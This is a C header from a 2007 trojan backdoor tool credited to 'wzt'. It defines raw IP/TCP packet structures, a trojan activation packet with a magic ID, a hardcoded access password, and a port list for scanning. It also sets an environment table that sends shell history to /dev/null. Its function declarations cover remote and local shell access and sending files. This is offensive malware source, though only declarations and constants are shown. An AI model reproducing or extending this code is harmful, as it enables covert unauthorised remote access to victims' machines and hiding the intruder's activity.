/* 
	send.h	(c) 2007	wzt 
*/

#ifndef SEND_H
#define SEND_H

#define MAXSIZE		65535
#define DATASIZE    1024
#define SEQ     	12345
#define	TROJAN_ID	6789
#define IPLEN		sizeof(struct iphdr)
#define TCPLEN 		sizeof(struct tcphdr)
#define PACKLEN 	sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(unsigned int) + sizeof(unsigned int) + strlen(trojan.data)
#define PSELEN		sizeof(struct psehdr)
#define	TROJANLEN   sizeof(unsigned int) + sizeof(unsigned int) + strlen(trojan.data)

#define ECHAR       0x1d
#define TIOCGWINSZ  0x5413
#define TIOCSWINSZ  0x5414

#define BUF         16384
#define BUF_SIZE    4096
#define ENVLEN      256
#define MAXNAME     100
#define MAXFD       5
#define CREATMODE   0777

#define PASSWD      "xsec"    /* deafult password,change it you like */
#define PASSERR		"passwd error"

#define VER         1.0

#define PORT_NUM    9

struct iphdr
{
    unsigned char       h_verlen;
    unsigned char       tos;
    unsigned short      total_len;
    unsigned short      ident;
    unsigned short      frag_and_flags;
    unsigned char       ttl;
    unsigned char       proto;
    unsigned short      checksum;
    unsigned int	    sourceIP;
    unsigned int        destIP;
};

struct tcphdr{
    unsigned short      th_sport;
    unsigned short      th_dport;
    unsigned int        th_seq;
    unsigned int        th_ack;
    unsigned char       th_lenres;
    unsigned char       th_flag;
    unsigned short      th_win;
    unsigned short      th_sum;
    unsigned short      th_urp;
};

struct psehdr{
	unsigned long       saddr;
	unsigned long       daddr;
	unsigned char       reserved;
	unsigned char       proto;
	unsigned short      len;
};

struct trojan_packet{
	unsigned int		trojan_id;
	unsigned int		datalen;
	char				data[DATASIZE];
};

char    *envtab[] =
{
    "",
    "",
    "LOGNAME=shitdown",
    "USERNAME=shitdown",
    "USER=shitdown",
  	"PS1=[\\ut@\\h \\W]\\$ ",
    "HISTFILE=/dev/null",
    "PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/usr/X11R6/bin:./bin",
    "!TERM",
    NULL
};

int     ports[PORT_NUM] = {21,22,23,25,80,110,111,445,3306};
int		sock_fd,sock_id;
int     winsize;

void usage(char *pro);
unsigned short in_cksum(unsigned short *addr,int len);
int tcpsend(char *dst_ip,int dst_port,char *data);
int scan_port(int ip);
void getshell_remote(int ip,int port);
void getshell_local(int port);
void sendenv(int sock);
void winch(int i);
void shell(int sock);
void send_file_raw(char *ip,int port,char *command);

#endif	/* _SEND_H_ */
